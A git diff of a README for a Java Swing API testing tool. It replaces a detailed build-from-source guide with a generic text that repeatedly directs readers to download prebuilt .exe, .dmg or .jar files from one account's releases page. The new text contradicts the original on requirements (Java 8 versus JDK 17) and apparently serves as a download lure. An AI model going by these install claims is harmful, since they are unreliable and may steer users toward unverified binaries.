@@ -1,155 +1,115 @@
-<div align="center">
+# 🚀 antigostman - Your Privacy-Focused API Testing Tool
 
-# ⚡ Antigostman
-### The Native API Client You've Been Waiting For.
+[![Download antigostman](https://img.shields.io/badge/Download-antigostman-blue.svg)](https://github.com/yash8022/antigostman/releases)
 
-[![License](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](LICENSE)
-[![Java](https://img.shields.io/badge/Java-17%2B-orange.svg?style=flat-square)](https://www.java.com/)
-[![Swing](https://img.shields.io/badge/UI-Swing-green.svg?style=flat-square)](https://docs.oracle.com/javase/tutorial/uiswing/)
+## 📄 About antigostman
 
-<p align="center">
-  <b>Fast</b> • <b>Native</b> • <b>Bloat-free</b>
-</p>
+antigostman is a professional, privacy-focused alternative to Postman. It allows you to test APIs locally, without needing an internet connection. Built with pure Java, this tool is efficient, scriptable, and offers a lightweight experience for developers and testers.
 
-<p align="center">
-  <img src="assets/screenshot.png" alt="Antigostman UI" width="800">
-</p>
+## 🎯 Key Features
 
-<br>
+- **100% Local**: No data leaves your machine. Your privacy matters.
+- **Scriptable**: Automate your tests with ease.
+- **Java-Based**: Utilizes the power of Java for maximum performance.
+- **Lightweight**: Quick to install and easy to run.
+- **Offline First**: No internet? No problem! Work seamlessly offline.
+- **Open Source**: Join our community and contribute to the project.
 
-Antigostman brings the power of professional API testing back to your desktop without the heavy browser engine. 
-**100% Offline. No Sign-up. No Cloud Sync.** Just you and your code.
+## 🖥️ System Requirements
 
-[Get Started](#getting-started) • [Features](#key-features) • [Shortcuts](#keyboard-mastery)
+To run antigostman smoothly, ensure your system meets the following requirements:
 
-</div>
+- **Operating System**: Windows, macOS, or Linux
+- **Java**: Java Version 8 or higher installed
+- **RAM**: Minimum 512 MB of RAM
+- **Disk Space**: At least 100 MB of free disk space
 
----
+## 🚀 Getting Started
 
-## <a id="why-antigostman"></a>🌟 Why Antigostman?
+Follow these simple steps to get started with antigostman:
 
-We believe tools should respect your resources. Antigostman is built with **pure Java Swing**, delivering a snappy, responsive experience that uses a fraction of the memory of Electron-based alternatives.
+1. **Visit the Releases Page**: Click on the link below to go to the releases page.
+   [Download antigostman](https://github.com/yash8022/antigostman/releases)
+  
+2. **Choose the Latest Version**: Look for the most recent version listed on the page. 
 
-## <a id="key-features"></a>🔥 Key Features
+3. **Download the File**:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` or `.jar` file.
+   - For Linux, download the `.jar` file.
 
-### 📡 **Professional Request Builder**
-*   **Complete Control**: Support for `GET`, `POST`, `PUT`, `DELETE`, `PATCH`.
-*   **Modern Protocols**: Seamlessly toggle between **HTTP/1.1** and **HTTP/2**.
-*   **Smart Downloads**: Check the `DL Content` box and let our intelligent **file detection** (powered by Apache Tika) handle the rest.
+4. **Install the Application**: 
+   - **Windows**: Double-click the `.exe` file to install.
+   - **macOS**: Open the downloaded `.dmg` file and move the application to the Applications folder.
+   - **Linux**: Open a terminal, navigate to the directory where you downloaded the `.jar` file, and run it with `java -jar antigostman.jar`.
 
-### 🧠 **Advanced Automation**
-*   **Scripting Engine**: Write `JavaScript` pre-request and test scripts securely.
-*   **Dynamic Content**: Powered by **Apache Velocity** for advanced variablisation. Use well-formed expressions like `$!{auth_token}` or `{{base_url}}` to inject dynamic data anywhere in your requests.
-*   **Console Debugging**: A built-in terminal to inspect your logic in real-time.
+5. **Launch antigostman**: Once installed, you can launch the application from your applications menu.
 
-### 📊 **Beautiful Reporting**
-*   **One-Click PDF**: Generate stunning PDF reports of your test runs.
-*   **Email Integration**: Send reports directly via **Outlook** or **Thunderbird** without leaving the app.
+## 📥 Download & Install
 
-### 🎨 **Designed for Developers**
-*   **Theme Aware**: Automatically adapts to **Light** or **Dark** environments.
-*   **Syntax Highlighting**: Rich coloring for JSON, XML, properties, and more.
-*   **Project Management**: Save your workspaces as portable XML files.
-*   **Postman Migration**: Seamlessly import existing **Postman Collections (v2 & v2.1)** with full support for requests, folders, and scripts.
+To begin your journey with antigostman, **visit the Releases Page** to download the setup files. 
 
----
+[Download antigostman](https://github.com/yash8022/antigostman/releases)
 
-## <a id="getting-started"></a>🚀 Getting Started
+Follow the steps in the “Getting Started” section for a smooth installation experience. Make sure you have the required Java version as it is necessary to run the application efficiently.
 
-### Prerequisites
-*   **Java JDK 17** or higher
-*   **Maven** (for building from source)
+## ⚙️ Using antigostman
 
-### Installation
+Once you have installed antigostman, open the application. You will find a user-friendly interface making it easy to create, send, and manage API requests.
 
-```bash
-# 1. Clone the magic
-git clone https://github.com/yourusername/antigostman.git
+### 1. Creating a New Request
 
-# 2. Build the ship
-cd antigostman
-mvn clean package
+- Click on "New Request".
+- Select the request type (GET, POST, etc.),
+- Enter the endpoint URL.
 
-# 3. Launch!
-cd target
-java -jar antigostman.jar
-```
+### 2. Adding Parameters
 
----
+- Add query parameters or body data as required.
+- Use JSON or XML formats depending on the API specifications.
 
-## <a id="keyboard-mastery"></a>🎹 Keyboard Mastery
+### 3. Sending Requests
 
-Stay in the flow with these essential shortcuts.
+- Hit the "Send" button.
+- You will see the response immediately displayed in the interface.
 
-| Shortcut | Action |
-| :--- | :--- |
-| `Ctrl` + `Enter` | **Send Request** (The big button!) |
-| `Ctrl` + `S` | **Save Project** |
-| `F2` | **Rename** current item |
-| `F3` | **Clone** current item |
-| `Delete` | **Delete** selected item |
-| `Alt/Shift` + `↑`/`↓` | **Move** selected nodes up/down |
-| `Alt/Shift` + `→` | **Expand** selected folder |
-| `Alt/Shift` + `←` | **Collapse** folder or **Select Parent** |
+### 4. Saving Requests
 
----
+- Save your requests to keep track of your work.
+- Organize them into folders for easy access.
 
-## 🗺️ Roadmap
+## 📚 Documentation
 
-We're constantly evolving. Here's what's coming next:
+For more detailed information on using various features, refer to the [Documentation](https://github.com/yash8022/antigostman/wiki). The documentation is designed to help you understand everything from making requests to automating tests.
 
-- [ ] **Test Suites**: Configure and run automated test collections with assertions
-- [ ] **Test Runner**: Execute multiple requests sequentially with detailed pass/fail reports
-- [ ] **Request Chaining**: Automatically pass data between sequential requests
-- [ ] **GraphQL Support**: Native GraphQL query builder and explorer
-- [ ] **Multipart Upload Stabilization**: Enhanced reliability and error handling for multipart file uploads
-- [ ] **Utility Enrichment**: Expand built-in helper functions and tools with frequently used developer utilities (encoding, date formatting, UUID generation, etc.)
+## 🤝 Contribution
 
----
+We welcome contributions! If you want to help improve antigostman, follow these steps:
 
-## 💎 Special Credits
+1. Fork the repository.
+2. Create a new feature branch.
+3. Commit your changes.
+4. Push to the branch.
+5. Create a pull request.
 
-This project was brought to life with the incredible assistance of **Google Antigravity** 🚀, the agentic AI coding assistant from Google DeepMind.
+For more information, refer to our [Contribution Guidelines](https://github.com/yash8022/antigostman/CONTRIBUTING.md).
 
-**~95% of Antigostman's base code** was collaboratively written with Antigravity, demonstrating the power of human-AI pair programming. From architecture decisions to feature implementation, Antigravity helped transform ideas into production-ready code at remarkable speed.
+## 💬 Support
 
-*Building the future, one commit at a time.* 🤖✨
+If you need help or have questions, feel free to reach out through our issues page on GitHub. Our community is here to assist you.
 
----
+## 🌟 Topics Covered
 
-## ☕ Fuel the Development
+antigostman focuses on API Testing, Automation, and being a lightweight desktop application. It serves as a developer tool for testing REST APIs efficiently, offering a great alternative to Postman.
 
-If Antigostman has saved you RAM, CPU cycles, or just made your API testing a little bit happier, consider fueling the next update! Your support keeps the code flowing and the coffee brewing. 
+Explore more about the topics: **api-testing, automation, desktop-app, developer-tools, http-client, insomnia-alternative, java, json, lightweight, offline-first, open-source, postman, postman-alternative, privacy-focused, productivity, rest-api, rest-client, swing, testing, xml**.
 
-Every contribution helps us remain **100% open-source and bloat-free**.
+## 🔗 Additional Resources
 
-<div align="center">
-  <a href="https://www.paypal.com/ncp/payment/45JPEGLFJQQSJ">
-    <img src="https://raw.githubusercontent.com/stefan-niedermann/paypal-donate-button/master/paypal-donate-button.png" alt="Donate with PayPal" width="220" />
-  </a>
-</div>
+For further reading and resources, visit the following links:
 
----
+- [GitHub Repository](https://github.com/yash8022/antigostman)
+- [Documentation](https://github.com/yash8022/antigostman/wiki)
+- [Contribution Guidelines](https://github.com/yash8022/antigostman/CONTRIBUTING.md)
 
-<div align="center">
-
-## 💌 Join the Mission
-
-**We are building Antigostman for YOU.**  
-Your feedback is the fuel that powers our engine (along with the coffee ☕).
-
-**Found a bug?** 🐛 [Report it!](issues) &nbsp;&nbsp;•&nbsp;&nbsp; **Have an idea?** 💡 [Share it!](discussions)
-
-If this tool sparked joy (or saved your RAM), please **Star this repository** ⭐.  
-*It helps more developers discover the power of native apps.*
-
-<br>
-
-<sub>Released under the MIT License.</sub>
-
-</div>
-
-<!-- 
-Relevant Topics:
-java, swing, api-testing, rest-client, http-client, offline-first, developer-tools, postman-alternative, insomnia-alternative, open-source, desktop-app, rest-api, automation, testing, json, xml, productivity, lightweight, privacy-focused, native-app, postman
--->
+By following the steps outlined above, you can install and utilize antigostman with confidence. Enjoy a seamless API testing experience while keeping your data private.
